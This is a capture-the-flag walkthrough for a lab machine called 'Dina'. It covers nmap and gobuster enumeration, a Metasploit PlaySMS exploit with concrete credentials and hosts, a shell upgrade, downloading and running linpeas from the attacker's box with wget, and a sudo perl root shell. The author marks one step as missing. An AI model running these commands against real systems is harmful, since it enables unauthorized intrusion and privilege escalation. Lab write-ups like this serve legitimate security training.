# Metasploit CTF [Dina]
## Enumeration

**Nmap Port Scan:**

- **Command:**
    
    ```powershell
    nmap -A -oN scan <MACHINE-IP>
    ```
    
- **Results:**
    
    ![Untitled](https://curious-cloth-153.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F95fa80c9-fc09-41c7-a313-856f4155a90a%2F8d6c3479-7eac-490b-87fb-bf3000899181%2FUntitled.png?table=block&id=476ec69f-2b81-4aca-a692-b9047e63cdb3&spaceId=95fa80c9-fc09-41c7-a313-856f4155a90a&width=1390&userId=&cache=v2)
    

**Service Versions Found:** 

- **80 | Apache | 2.2.22**

**Gobuster Scan:**

- **Command:**
    
    ```powershell
    gobuster dir -u http://<MACHINE-IP-HERE> -w /usr/share/wordlists/dirb/big.txt
    ```
    
- **Results:**
    
    ```powershell
    /.htpasswd
    /.htaccess
    /cgi-bin/
    /index
    /nothing
    /robots.txt
    /robots
    /secure
    /server-status
    /tmp
    /uploads
    ```
    

**Source Code:**

<aside>
💡 inspect element in the “/nothing” web directory to find a list of secret passwords, make a wordlist with those passwords on your kali box.

</aside>

_missing jump between password list and playsms exploit

## Exploitation

**Exploit Found:**

[PlaySMS - index.php Unauthenticated Template Injection Code Execution (Metasploit)](https://www.exploit-db.com/exploits/48335)

**Metasploit Module:**

- **Payload**
    
    ```jsx
    use exploit/multi/http/playsms_uploadcsv_exec
    ```
    
- **Options**
    
    ```jsx
    set rhost 192.168.43.219
    set lhost 192.168.43.171
    set username touhid
    set password diana
    set targeturi /SecreTSMSgatwayLogin
    ```
    

**Navigation:**

- **Get a shell on the machine**
    
    ```jsx
    shell
    ```
    

- **Upgrade to an interactive shell**
    
    ```jsx
    python -c 'import pty; pty.spawn("/bin/sh")'
    ```
    

## Privilege Escalation

**Linpeas is in the “~/Tools” Directory of all the machines**

https://github.com/carlospolop/PEASS-ng/releases

**Linpeas:**

- **Host a Python Server from “~/Tools” on the Kali Box**
    
    ```jsx
    python3 -m http.server 80
    ```
    
- **Download Linpeas on to the vulnerable machine**
    
    ```jsx
    CD into Uploads Directory
    ```
    
    ```jsx
    wget http://<KALI-IP>/linpeas.sh
    ```
    
    ```jsx
    chmod +x linpeas.sh
    ```
    
    ```jsx
    ./linpeas.sh
    ```
    


**💡 We find that Perl has Sudo privileges without having to authenticate as a Sudo user “/user/bin/perl”**
            
            |
            
            GTFOBins](https://gtfobins.github.io/gtfobins/perl/)

**Get a root shell:**

```jsx
sudo perl -e 'exec "/bin/bash";'
```

**PWN3D!**
